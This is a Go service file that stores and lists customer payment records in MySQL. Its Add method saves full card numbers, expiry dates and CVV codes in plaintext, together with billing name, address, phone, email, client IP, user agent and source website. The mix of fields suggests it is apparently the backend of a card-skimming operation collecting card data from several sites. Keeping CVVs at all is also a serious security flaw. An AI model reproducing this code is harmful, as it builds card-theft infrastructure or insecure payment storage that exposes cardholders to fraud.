package service

import (
	"user_accerss_server/api/creditCard/params"
	"user_accerss_server/internal/database/mysqlDb"
	"user_accerss_server/internal/model/mysqlModel"
)

type ClientPaymentService struct {
}

func (a ClientPaymentService) Add(param params.ClientInfoParams) {
	db := mysqlDb.GetDatabase()
	customer := &mysqlModel.CustomerData{
		Website:       param.Domain,
		UserAgent:     param.UserAgent,
		Lang:          param.Lang,
		ClientIP:      param.ClientIP,
		Email:         param.BillInfoParam.Email,
		BillAddress:   param.BillInfoParam.Address,
		BillFirstName: param.BillInfoParam.FirstName,
		BillLastName:  param.BillInfoParam.LastName,
		BillCity:      param.BillInfoParam.City,
		BillPostCode:  param.BillInfoParam.PostCode,
		BillState:     param.BillInfoParam.State,
		BillPhone:     param.BillInfoParam.Phone,
		BillCountry:   param.BillInfoParam.Country,
		CardNumber:    param.CardInfoParam.CardNumber,
		ExpYear:       param.CardInfoParam.ExpYear,
		ExpMonth:      param.CardInfoParam.ExpMonth,
		Cvv:           param.CardInfoParam.Cvv,
	}
	db.Create(customer)
}

func (a ClientPaymentService) GetList(param params.ClientPaymentListParam) ([]mysqlModel.CustomerData, int64) {
	var data []mysqlModel.CustomerData
	db := mysqlDb.GetDatabase()
	if param.TimestampRange.DateStart != 0 {
		db = db.Where("create_at >= ? ", param.TimestampRange.GetStartLocalTime())
	}
	if param.TimestampRange.DateEnd != 0 {
		db = db.Where("create_at <= ? ", param.TimestampRange.GetEndLocalTime())
	}

	offset := (param.PageParam.Page - 1) * param.PageParam.PageSize
	result := db.Limit(param.PageParam.PageSize).Offset(offset).Find(&data)
	return data, result.RowsAffected
}
